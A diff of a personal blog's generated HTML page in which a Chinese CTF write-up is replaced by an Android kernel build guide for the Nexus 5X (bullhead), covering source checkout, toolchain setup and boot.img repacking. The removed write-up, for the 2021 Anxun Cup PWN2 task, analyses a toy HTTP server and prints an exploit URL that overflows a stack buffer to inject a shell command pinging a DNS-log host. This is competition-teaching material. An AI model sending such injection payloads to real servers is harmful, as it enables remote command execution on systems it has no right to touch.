@@ -108,39 +108,33 @@
 
 
 
-  <meta name="description" content="2021安洵杯线下赛 PWN2下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp 程序分析这题模拟了一个轻量的HTTP服务器main函数里首先会读取一个命令行参数,这个参数是一个目录然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1">
+  <meta name="description" content="Android Kernel Build整个kernel的编译过程还是踩了许多坑的，前一周搞得，再不写估计就忘了怎么编译的了 环境说明因为其实没找到对应的taimen PIXEL2XL的linux kernel版本，然后第一次刷把手机刷坏了(只能卡在fastboot界面了)，然后所有的fastboot的命令全部失败  问了原来买手机的老板，说  8.0的我也是 用win7系统的电脑才能刷 搞不懂原">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2021安洵杯Pwn2 WP">
-<meta property="og:url" content="http://yoursite.com/2021/12/14/Anxun4/index.html">
+<meta property="og:title" content="Android Kernel Build">
+<meta property="og:url" content="http://yoursite.com/2022/09/06/Android Kernel Build/index.html">
 <meta property="og:site_name" content="zzrR0">
-<meta property="og:description" content="2021安洵杯线下赛 PWN2下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp 程序分析这题模拟了一个轻量的HTTP服务器main函数里首先会读取一个命令行参数,这个参数是一个目录然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1">
+<meta property="og:description" content="Android Kernel Build整个kernel的编译过程还是踩了许多坑的，前一周搞得，再不写估计就忘了怎么编译的了 环境说明因为其实没找到对应的taimen PIXEL2XL的linux kernel版本，然后第一次刷把手机刷坏了(只能卡在fastboot界面了)，然后所有的fastboot的命令全部失败  问了原来买手机的老板，说  8.0的我也是 用win7系统的电脑才能刷 搞不懂原">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/1.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/2.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/3.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/4.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/5.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/6.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/7.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/8.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/9.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/10.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/11.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/12.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/13.png">
-<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/14.png">
-<meta property="og:updated_time" content="2021-12-14T12:34:01.992Z">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906091100060.png">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906092531067.png">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906095032251.png">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906095822557.png">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906114033714.png">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906110114679.png">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906110806099.png">
+<meta property="og:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906111207295.png">
+<meta property="og:updated_time" content="2022-09-06T03:54:45.386Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2021安洵杯Pwn2 WP">
-<meta name="twitter:description" content="2021安洵杯线下赛 PWN2下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp 程序分析这题模拟了一个轻量的HTTP服务器main函数里首先会读取一个命令行参数,这个参数是一个目录然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1">
-<meta name="twitter:image" content="http://yoursite.com/2021/12/14/Anxun4/1.png">
+<meta name="twitter:title" content="Android Kernel Build">
+<meta name="twitter:description" content="Android Kernel Build整个kernel的编译过程还是踩了许多坑的，前一周搞得，再不写估计就忘了怎么编译的了 环境说明因为其实没找到对应的taimen PIXEL2XL的linux kernel版本，然后第一次刷把手机刷坏了(只能卡在fastboot界面了)，然后所有的fastboot的命令全部失败  问了原来买手机的老板，说  8.0的我也是 用win7系统的电脑才能刷 搞不懂原">
+<meta name="twitter:image" content="http://yoursite.com/2022/09/06/Android%20Kernel%20Build/image-20220906091100060.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2021/12/14/Anxun4/">
+  <link rel="canonical" href="http://yoursite.com/2022/09/06/Android Kernel Build/">
 
 
 
@@ -150,7 +144,7 @@
   };
 </script>
 
-  <title>2021安洵杯Pwn2 WP | zzrR0</title>
+  <title>Android Kernel Build | zzrR0</title>
   
 
 
@@ -319,7 +313,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/14/Anxun4/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/09/06/Android Kernel Build/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zzrR0">
@@ -336,7 +330,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2021安洵杯Pwn2 WP
+          <h1 class="post-title" itemprop="name headline">Android Kernel Build
               
             
           </h1>
@@ -361,7 +355,7 @@
                 
               
 
-              <time title="创建时间：2021-12-14 20:31:42 / 修改时间：20:34:01" itemprop="dateCreated datePublished" datetime="2021-12-14T20:31:42+08:00">2021-12-14</time>
+              <time title="创建时间：2022-09-06 11:53:09 / 修改时间：11:54:45" itemprop="dateCreated datePublished" datetime="2022-09-06T11:53:09+08:00">2022-09-06</time>
             
 
             
@@ -383,7 +377,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Android/" itemprop="url" rel="index"><span itemprop="name">Android</span></a></span>
 
                 
                 
@@ -398,9 +392,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2021/12/14/Anxun4/#comments" itemprop="discussionUrl">
+                <a href="/2022/09/06/Android Kernel Build/#comments" itemprop="discussionUrl">
                 
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/12/14/Anxun4/" itemprop="commentCount"></span>
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/09/06/Android Kernel Build/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -408,7 +402,7 @@
 
           
           
-             <span id="/2021/12/14/Anxun4/" class="leancloud_visitors" data-flag-title="2021安洵杯Pwn2 WP">
+             <span id="/2022/09/06/Android Kernel Build/" class="leancloud_visitors" data-flag-title="Android Kernel Build">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -446,23 +440,58 @@
       
 
       
-        <h1 id="2021安洵杯线下赛-PWN2"><a href="#2021安洵杯线下赛-PWN2" class="headerlink" title="2021安洵杯线下赛 PWN2"></a>2021安洵杯线下赛 PWN2</h1><p>下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp</p>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这题模拟了一个轻量的HTTP服务器<br>main函数里首先会读取一个命令行参数,这个参数是一个目录<br>然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1</p>
-<p><img src="/2021/12/14/Anxun4/1.png" alt></p>
-<p>第二段是gets，得到请求头里面的请求头部，<br><img src="/2021/12/14/Anxun4/2.png" alt></p>
-<p>这里只对X-Forword-For进行处理，获取到值之后会拷贝到dest的最初的位置<br>这个值后面会有限定</p>
-<p>然后会比较请求方法必须为get方法</p>
-<p>第三段是对url路径进行过滤，基本上阻断了目录穿越<br><img src="/2021/12/14/Anxun4/3.png" alt><br>下面是解析url后面的参数,这种 index.html?username=root&amp;password=root</p>
-<p>第四段是对url进行判断，然后跳到对应的cgi函数进行处理(这里模拟的CGI)<br><img src="/2021/12/14/Anxun4/4.png" alt><br>总共是下面四个cgi<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">logctl.cgi  0x402994</span><br><span class="line">login.cgi   0x401E62</span><br><span class="line">logout.cgi  0x402396</span><br><span class="line">wifictl.cgi 0x40283E</span><br></pre></td></tr></table></figure></p>
-<p>其中最明显有洞的地方，就是在logctl.cgi中，有个popen的命令注入，也很符合实际的命令注入的模式<br><img src="/2021/12/14/Anxun4/5.png" alt></p>
-<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>字符串首先来源于传进来的url参数，再回头看param_parse的部分<br><img src="/2021/12/14/Anxun4/6.png" alt><br>这里逻辑是拆分key 和value，然后调用save_param保存参数<br><img src="/2021/12/14/Anxun4/7.png" alt><br>看save_param的逻辑，可以看到第i个参数的key会保存到dest[16<em>i + 32]，value会保存到dest[16</em>i + 40]的地方</p>
-<p>回到logctl.cgi<br><img src="/2021/12/14/Anxun4/8.png" alt><br>popen的参数command来源于wafStrng，WafString由sub_402CAC和block_check产生<br>block_check的第一个参数和第二个参数传的就是前面保存的key和value<br><img src="/2021/12/14/Anxun4/9.png" alt><br>block_check的逻辑是对输入的参数进行过滤，并且将参数里面包含的非法字符串保存到wafString中<br>“$;`’&amp;|&lt;&gt;^\n\r<br>因此这里得到的结论是命令注入的字符串无法可控。</p>
-<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>上面分析完，就觉得命令注入没法利用，因此我就看了其他逻辑，其中在main函数的后面<br><img src="/2021/12/14/Anxun4/10.png" alt><br>这里疑似存在一个任意文件读取的洞，但是url前面过滤死了，想了一会也绕不过去。<br>那基本上还剩的可疑的点就是strcpy的栈溢出了<br>在最开始接受URL的时候，长度设定了10000，非常大<br><img src="/2021/12/14/Anxun4/11.png" alt></p>
-<p>保存参数的时候也没有对长度进行限制，最终到检查非法字符时<br><img src="/2021/12/14/Anxun4/12.png" alt><br>这里存在栈溢出</p>
-<p>最开始想的是怎么利用栈溢出执行代码，可是程序开了NX，然后也没有好的地方可以泄露libc地址，<br><img src="/2021/12/14/Anxun4/13.png" alt><br><img src="/2021/12/14/Anxun4/14.png" alt><br>后来发现这个函数最后拷贝出非法字符串时用的v14刚好在s的上面，因此我们可以直接溢出到v14，然后后面拷贝v14的时候就拷贝的是我们的命令了</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这里我也没写利用脚本，直接给个构造的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/logctl.cgi?ring_token=1639212853:123&amp;username=;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;;ping+19d9fbde.dns.1433.eu.org; HTTP/1.1\n</span><br><span class="line">X-Forword-For: 192.168.1.20</span><br></pre></td></tr></table></figure></p>
-<p>这里执行的命令是ping DNSLOG，可以填上自己的命令</p>
-<p><a href="https://log.xn--9tr.com/" target="_blank" rel="noopener">https://log.xn--9tr.com/</a> DNSLog平台</p>
+        <h1 id="Android-Kernel-Build"><a href="#Android-Kernel-Build" class="headerlink" title="Android Kernel Build"></a>Android Kernel Build</h1><p>整个kernel的编译过程还是踩了许多坑的，前一周搞得，再不写估计就忘了怎么编译的了</p>
+<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>因为其实没找到对应的taimen PIXEL2XL的linux kernel版本，然后第一次刷把手机刷坏了(只能卡在fastboot界面了)，然后所有的fastboot的命令全部失败</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906091100060.png" alt="image-20220906091100060"></p>
+<p>问了原来买手机的老板，说</p>
+<blockquote>
+<p>8.0的我也是 用win7系统的电脑才能刷 搞不懂原因</p>
+</blockquote>
+<p>所以抽时间把手机发给老板重刷吧，我觉得一开始应该是好的，只是后来我kernel版本刷崩了</p>
+<p>具体环境，linuxkernel我用的是ubuntu20，AOSP还是沿用r0env，直接按照原先编译AOSP的方法编译即可</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906092531067.png" alt="image-20220906092531067"></p>
+<p>AOSP自带有编译好的kernel image，再整个AOSP编译完成之后会被打包到boot.img中，所以我们把自编译的内核能重打包替换到boot.img里面就可以刷入我们的内核</p>
+<h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p><a href="https://www.cnblogs.com/blogs-of-lxl/p/7447178.html" target="_blank" rel="noopener">Android : 修改内核源码 and 编译、打包成新的boot.img - sheldon_blogs - 博客园 (cnblogs.com)</a></p>
+<p>先下载kernel的源码，现在Google提供了分支的下载了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//android.googlesource.com/kernel/msm.git</span></span><br></pre></td></tr></table></figure>
+<p>几个分支,我们主流用Google系的产品，就下载msm就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">goldfish 项目包含适用于所模拟的平台的内核源代码。</span><br><span class="line">msm 项目包含适用于 ADP1、ADP2、Nexus One、Nexus 4、Nexus 5、Nexus 6、Nexus 5X、Nexus 6P、Nexus 7 (2013)、Pixel 和 Pixel XL 的源代码，可用作使用 Qualcomm MSM 芯片组的起点。</span><br><span class="line">omap 项目用于 PandaBoard 和 Galaxy Nexus，可用作使用 TI OMAP 芯片组的起点。</span><br><span class="line">samsung 项目用于 Nexus S，可用作使用 Samsung Hummingbird 芯片组的起点。</span><br><span class="line">tegra 项目用于 Xoom、Nexus 7 (2012)、Nexus 9，可用作使用 NVIDIA Tegra 芯片组的起点。</span><br><span class="line">exynos 项目包含适用于 Nexus 10 的内核源代码，可用作使用 Samsung Exynos 芯片组的起点。</span><br><span class="line">x86_64 项目包含适用于 Nexus Player 的内核源代码，可用作使用 Intel x86_64 芯片组的起点。</span><br><span class="line">hikey-linaro 项目用于 HiKey 参考板，可用作使用 HiSilicon 620 芯片组的起点。</span><br></pre></td></tr></table></figure>
+<p>msm下面还有很多具体型号的分支</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906095032251.png" alt="image-20220906095032251"></p>
+<p>grep一下bullhead的分支</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906095822557.png" alt="image-20220906095822557"></p>
+<p>我们编译的AOSP是8.0的oreo，所以切换到这个版本</p>
+<p>remotes/origin/android-msm-bullhead-3.10-oreo-m2</p>
+<h2 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h2><p>先切换到bullhead上面</p>
+<p>git checkout remotes/origin/android-msm-bullhead-3.10-oreo-m2</p>
+<p>编译之前也得先clone一下aarch64的gcc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/</span><br></pre></td></tr></table></figure>
+<p>这个clone下来之后也包含大量的分支，我们配套的是oreo Android8.0，因此就将其切换到8.0的分支</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">origin/oreo-m2-release</span><br></pre></td></tr></table></figure>
+<p>编译的时候出现forbidden的错</p>
+<p><a href="https://blog.csdn.net/LoongEmbedded/article/details/114387235" target="_blank" rel="noopener">(38条消息) android编译error, forbidden warning出错问题解决_loongembedded的博客-CSDN博客</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>gcc-wrapper.py中注释掉interpret_warning(line)即可</span><br><span class="line"></span><br><span class="line">kernel\msm<span class="number">-4.9</span>\scripts\gcc-wrapper.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        proc = subprocess.Popen(args, stderr=subprocess.PIPE)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> proc.stderr:</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt; sys.stderr, line,</span><br><span class="line">            <span class="comment">#interpret_warning(line) #注释掉这行</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://www.daimajiaoliu.com/daima/4871f9072900401" target="_blank" rel="noopener">Android 驱动开发—Android Linux 内核编译 Nexus 5x (daimajiaoliu.com)</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/mnt/android/android<span class="_">-e</span>-7.1.1-r31/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> ARCH=arm64</span><br><span class="line"><span class="built_in">export</span> SUBARCH=arm64</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE=aarch64-linux-android-</span><br><span class="line">make bullhead_defconfig</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>声明几个环境变量之后，直接make就行,make -j4这种多核编译好像有莫名其妙的错误</p>
+<p>如果想自己修改内核选项，就先运行完make bullhead_defconfig，执行make menuconfig，修改.config文件</p>
+<p>最后编译完成的kernel image在这个下面</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906114033714.png" alt="image-20220906114033714"></p>
+<h2 id="重打包Kernel"><a href="#重打包Kernel" class="headerlink" title="重打包Kernel"></a>重打包Kernel</h2><p>两种方式</p>
+<p>一种是替换AOSP编译时的kernel文件，这样编译完ASOP自动就打包到boot.img里面了</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906110114679.png" alt="image-20220906110114679"></p>
+<p>bullhead的就在这个目录下面</p>
+<p>第二种方式是直接对boot.img进行操作</p>
+<p>用到的工具是AIK</p>
+<p><a href="https://www.freebuf.com/articles/terminal/229624.html" target="_blank" rel="noopener">Kernel Hack实战：修改并编译手机内核源码对抗反调试 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://github.com/osm0sis/Android-Image-Kitchen/tree/AIK-Linux" target="_blank" rel="noopener">osm0sis/Android-Image-Kitchen at AIK-Linux (github.com)</a></p>
+<p>直接把boot.img放到同级目录下，然后执行unpackimg.sh</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906110806099.png" alt="image-20220906110806099"></p>
+<p>我们的目标就是替换这个boot.img-kernel，之后再调用repackimg.sh,就可以重打包成新的image-new.image</p>
+<p>之后为了防止损坏原有的系统，可以采用临时刷入boot的方法，</p>
+<p><img src="/2022/09/06/Android Kernel Build/image-20220906111207295.png" alt="image-20220906111207295"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>内核编译虽然有成熟的工具链，但是相对来讲还是比较复杂，在我自己编译的实践的过程中也是会遇到各种各样的错误，只能说按照上面的步骤，确实是编译成功了，如果突然遇到什么问题，可以重置一下环境，</p>
+<p>在编译的过程中，最关键的还是gcc和kernel的版本要对</p>
 
       
     </div>
@@ -490,15 +519,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2022/08/08/Android Frida/" rel="next" title="Android Frida">
+                <i class="fa fa-chevron-left"></i> Android Frida
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/12/19/HouseOfPig/" rel="prev" title="House of pig复现">
-                House of pig复现 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -667,7 +696,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2021安洵杯线下赛-PWN2"><span class="nav-number">1.</span> <span class="nav-text">2021安洵杯线下赛 PWN2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">1.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令注入"><span class="nav-number">1.2.</span> <span class="nav-text">命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出"><span class="nav-number">1.3.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">1.4.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Android-Kernel-Build"><span class="nav-number">1.</span> <span class="nav-text">Android Kernel Build</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境说明"><span class="nav-number">1.1.</span> <span class="nav-text">环境说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下载源码"><span class="nav-number">1.2.</span> <span class="nav-text">下载源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编译源码"><span class="nav-number">1.3.</span> <span class="nav-text">编译源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#重打包Kernel"><span class="nav-number">1.4.</span> <span class="nav-text">重打包Kernel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -858,9 +887,9 @@
   
     <script type="text/javascript">
       var disqus_config = function () {
-        this.page.url = 'http://yoursite.com/2021/12/14/Anxun4/';
-        this.page.identifier = '2021/12/14/Anxun4/';
-        this.page.title = '2021安洵杯Pwn2 WP';
+        this.page.url = 'http://yoursite.com/2022/09/06/Android Kernel Build/';
+        this.page.identifier = '2022/09/06/Android Kernel Build/';
+        this.page.title = 'Android Kernel Build';
         };
       function loadComments () {
         var d = document, s = d.createElement('script');
